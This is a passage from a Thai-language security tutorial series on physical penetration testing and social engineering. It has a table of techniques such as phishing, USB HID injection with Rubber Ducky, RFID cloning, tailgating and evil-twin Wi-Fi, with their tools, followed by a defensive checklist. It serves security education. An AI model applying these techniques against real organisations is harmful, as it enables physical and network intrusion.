# อัพโหลด sketch ไป Arduino
# เสียบ USB → execute อัตโนมัติ
```

---

## สรุป

| Technique | Tools | Difficulty | Detection |
|-----------|-------|------------|----------|
| Lock Picking | Pick set, Proxmark3 | Medium | Low |
| Social Engineering | Scripts, props | Medium | Low |
| Phishing | GoPhish, SET | Low | Medium |
| USB HID | Rubber Ducky | Low | Medium |
| RFID Cloning | Proxmark3 | Medium | Low |
| Tailgating | Physical | Low | Medium |
| Evil Twin | hostapd | Medium | High |

---

## การป้องกัน

```
Physical Security Checklist:
✓ Security awareness training ประจำปี
✓ Phishing simulation ทุก quarter
✓ Multi-factor authentication ทุก access point
✓ Visitor escort policy
✓ USB port control via MDM/Group Policy
✓ Clean desk policy
✓ Shredder สำหรับเอกสารสำคัญ
✓ Background check พนักงาน
✓ Badge challenge training
✓ Incident reporting procedure
```

---

← [Part 59: Cloud Security Advanced](Part-59-Cloud-Advanced.md) | [Part 61: IoT Security](Part-61-IoT-Security.md) →
